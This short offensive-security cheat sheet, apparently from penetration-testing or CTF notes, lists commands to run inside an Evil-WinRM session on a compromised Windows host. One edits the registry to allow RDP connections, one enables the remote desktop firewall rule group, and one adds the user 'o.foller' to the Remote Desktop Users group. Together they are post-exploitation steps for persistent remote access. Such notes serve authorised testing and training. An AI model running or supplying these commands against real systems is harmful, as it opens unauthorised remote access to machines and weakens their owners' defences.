# Enable RDP
```bash
#In Evil-WinRM Session
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Change Rules 
netsh advfirewall set rule group="remote desktop" new enable=Yes

# Add a user to RDP Group
net localgroup "Remote Desktop Users" o.foller /add

```